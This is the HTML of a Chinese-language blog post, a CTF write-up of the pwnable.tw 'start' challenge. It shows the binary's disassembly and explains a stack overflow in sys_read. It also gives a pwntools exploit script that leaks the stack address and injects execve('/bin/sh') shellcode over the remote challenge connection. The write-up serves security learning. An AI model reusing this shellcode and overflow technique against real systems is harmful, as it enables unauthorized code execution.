@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8" />
+
+    
+
+    
+
+    <title>pwnable.tw系列——start | TinyMagicka</title>
+    <meta name="author" content="TinyMagicka" />
+    <meta name="version" content="1.0.0" />
+    <meta name="keywords" content="Android PWN" />
+    <meta name="description" content="pwnable.tw系列从此开始  
+
+pwnable.tw系列——start我的工作环境是kali-2.0下载start 查看：    
+123456789101112131415161718192021222324252627282930313233343536root@kali:~/tmp# objdump -d start start:     file format elf32-i386Disassembly of section .text:08048060 &amp;lt;_start&amp;g" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no" />
+    <meta name="baidu-site-verification" content="F0CXvmUgA9" />
+
+    
+    
+    <link rel="icon" href="/images/favicon.png">
+    
+
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+
+    <div class="app">
+        <header class="header clearfix">
+    <div id="nav" class="nav">
+    <button id="open-panel" class="open-panel"><i class="icon-library"></i></button>
+
+    <nav class="nav-inner">
+
+        
+        
+        <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+        </li>
+        
+        
+        
+        <li class="nav-item nav-item-tag">
+            <a id="nav-tag" class="nav-link" href="#">标签</a>
+            <div id="nav-tags" class="nav-tag-wrap">
+                <i class="nav-tag-arrow"></i>
+                
+  <div class="widget-wrap">
+    <h3 class="widget-title">
+        <i class="icon-tag vm"></i>
+        <span class="vm">Tags</span>
+    </h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Papers/">Papers</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/metasploit/">metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnable-tw系列/">pwnable.tw系列</a></li></ul>
+    </div>
+  </div>
+
+
+            </div>
+        </li>
+        
+        
+        
+        <li class="nav-item">
+            <a class="nav-link" href="/archives">归档</a>
+        </li>
+        
+        
+        
+        <li class="nav-item">
+            <a class="nav-link" href="/about">关于</a>
+        </li>
+        
+        
+        
+
+    </nav>
+</div>
+
+    <aside id="aside" class="aside">
+    <div id="aside-mask" class="aside-mask"></div>
+    <div id="aside-inner" class="aside-inner">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit"><i class="icon-search-stroke"></i></button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+
+        
+        
+        
+        
+
+        
+        <ol class="toc"><li class="toc-item toc-level-6"><a class="toc-link" href="#pwnable-tw系列——start"><span class="toc-number">1.</span> <span class="toc-text">pwnable.tw系列——start</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#需要解决的难题：是如何知道自己写进栈的shellcode的地址？"><span class="toc-number">2.</span> <span class="toc-text">需要解决的难题：是如何知道自己写进栈的shellcode的地址？</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#exp-py"><span class="toc-number">3.</span> <span class="toc-text">exp.py</span></a></li></ol>
+        
+    </div>
+</aside>
+
+</header>
+
+        <div id="content" class="content"><article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            pwnable.tw系列——start
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="/2017/10/01/pwnabletw_start/">
+    
+    <i class="icon-calendar"></i>
+    
+    <time datetime="2017-10-01T08:26:08.000Z" itemprop="datePublished">2017-10-01</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag"></i>
+    <a class="article-tag-link" href="/tags/pwn/">pwn</a>, <a class="article-tag-link" href="/tags/pwnable-tw系列/">pwnable.tw系列</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <p>pwnable.tw系列从此开始  </p>
+<a id="more"></a>
+<h6 id="pwnable-tw系列——start"><a href="#pwnable-tw系列——start" class="headerlink" title="pwnable.tw系列——start"></a>pwnable.tw系列——start</h6><p>我的工作环境是kali-2.0<br>下载start 查看：    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/tmp# objdump -d start </span><br><span class="line"></span><br><span class="line">start:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">08048060 &lt;_start&gt;:</span><br><span class="line"> 8048060:	54                   	push   %esp</span><br><span class="line"> 8048061:	68 9d 80 04 08       	push   $0x804809d</span><br><span class="line"> 8048066:	31 c0                	xor    %eax,%eax</span><br><span class="line"> 8048068:	31 db                	xor    %ebx,%ebx</span><br><span class="line"> 804806a:	31 c9                	xor    %ecx,%ecx</span><br><span class="line"> 804806c:	31 d2                	xor    %edx,%edx</span><br><span class="line"> 804806e:	68 43 54 46 3a       	push   $0x3a465443</span><br><span class="line"> 8048073:	68 74 68 65 20       	push   $0x20656874</span><br><span class="line"> 8048078:	68 61 72 74 20       	push   $0x20747261</span><br><span class="line"> 804807d:	68 73 20 73 74       	push   $0x74732073</span><br><span class="line"> 8048082:	68 4c 65 74 27       	push   $0x2774654c</span><br><span class="line"> 8048087:	89 e1                	mov    %esp,%ecx</span><br><span class="line"> 8048089:	b2 14                	mov    $0x14,%dl</span><br><span class="line"> 804808b:	b3 01                	mov    $0x1,%bl</span><br><span class="line"> 804808d:	b0 04                	mov    $0x4,%al</span><br><span class="line"> 804808f:	cd 80                	int    $0x80</span><br><span class="line"> 8048091:	31 db                	xor    %ebx,%ebx</span><br><span class="line"> 8048093:	b2 3c                	mov    $0x3c,%dl</span><br><span class="line"> 8048095:	b0 03                	mov    $0x3,%al</span><br><span class="line"> 8048097:	cd 80                	int    $0x80</span><br><span class="line"> 8048099:	83 c4 14             	add    $0x14,%esp</span><br><span class="line"> 804809c:	c3                   	ret    </span><br><span class="line"></span><br><span class="line">0804809d &lt;_exit&gt;:</span><br><span class="line"> 804809d:	5c                   	pop    %esp</span><br><span class="line"> 804809e:	31 c0                	xor    %eax,%eax</span><br><span class="line"> 80480a0:	40                   	inc    %eax</span><br><span class="line"> 80480a1:	cd 80                	int    $0x80</span><br></pre></td></tr></table></figure>
+<pre><code>可以看到这是个非常精简的elf文件，程序入口点是_start     
+先后调用的两个中断分别是 sys_write和sys_read        
+明显sys_read可以栈溢出。但是如何利用这个溢出？      
+可以发现没有加载各种库，没有plt，连输入输出都是使用0x80中断 因此想ret2libc都不行   
+
+想想第一应该不会太难，所以尝试最基本的：将EIP劫持到自己控制的栈中     
+这种漏洞利用方式默认系统没有启用NX和ASLR和Canary，就是没有开启任何保护机制
+</code></pre><h6 id="需要解决的难题：是如何知道自己写进栈的shellcode的地址？"><a href="#需要解决的难题：是如何知道自己写进栈的shellcode的地址？" class="headerlink" title="需要解决的难题：是如何知道自己写进栈的shellcode的地址？"></a>需要解决的难题：是如何知道自己写进栈的shellcode的地址？</h6><pre><code>答： 首先使用栈溢出将EIP指向0x8048087 sys_write函数打印出栈地保存的ESP  
+ 获得ESP具体数值。其他的就照常进行了
+</code></pre><h6 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">shell0 = &quot;A&quot;*20 + &quot;\x87\x80\x04\x08&quot;</span><br><span class="line">#exploit-db.com</span><br><span class="line">shell = &quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70&quot;\</span><br><span class="line">        &quot;\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61&quot;\</span><br><span class="line">        &quot;\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52&quot;\</span><br><span class="line">        &quot;\x51\x53\x89\xe1\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">p = remote(&quot;chall.pwnable.tw&quot;, 10000)</span><br><span class="line">#p = process(&quot;/root/tmp/start&quot;)</span><br><span class="line">p.recvuntil(&quot;Let&apos;s start the CTF:&quot;)</span><br><span class="line">p.send(shell0)</span><br><span class="line">#获取栈地的ESP+4, 作为新的栈顶</span><br><span class="line">ret = p.recv(4)</span><br><span class="line">p.recv()</span><br><span class="line">ret = p32(u32(ret)+20)</span><br><span class="line">p.send(&quot;A&quot;*20 + ret + shell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+        
+    </section>
+</article>
+
+
+
+<div class="comments">
+    <div id="disqus_thread">
+        <p class="comment-tips">国内查看评论需要代理~</p>
+    </div>
+    <script>
+    window.disqus_config = function () {
+        this.language = 'zh';
+        this.page.url = 'http://yoursite.com/2017/10/01/pwnabletw_start/';
+        this.page.title = 'pwnable.tw系列——start';
+        this.page.identifier = '2017/10/01/pwnabletw_start/';
+    };
+    (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        s.src = 'https://name.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+</div>
+        <footer class="footer">
+    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>, Theme by <a href="https://github.com/sanonz/hexo-theme-concise" target="_blank">Concise</a>
+</footer>
+
+<script type="text/javascript" src="//s13.cnzz.com/z_stat.php?id=1234567890&amp;web_id=1234567890"></script>
+
+
+    </div>
+
+    <script type="text/javascript" src="https://cdn.bootcss.com/jquery/1.9.0/jquery.min.js"></script>
+    
+    <script type="text/javascript" src="/js/scrollspy.min.js"></script>
+    
+    <script type="text/javascript">
+        $(function() {
+            var nodes = {
+                nav: $('#nav'),
+                aside: $('#aside'),
+                navTags: $('#nav-tags')
+            };
+
+            $('#open-panel, #aside-mask').on('click', function() {
+                nodes.aside.toggleClass('panel-show');
+            });
+            $('#nav-tag').on('click', function(event) {
+                event.preventDefault();console.log(nodes.navTags.attr('class'))
+                nodes.navTags.toggleClass('tag-show');console.log(nodes.navTags.attr('class'))
+            })/*.hover(function() {
+                nodes.navTags.addClass('tag-show');
+            }, function() {
+                nodes.navTags.removeClass('tag-show');
+            });*/
+
+            
+            $(document.body).scrollspy({target: '#aside-inner'});
+            
+        });
+    </script>
+
+</body>
+</html>
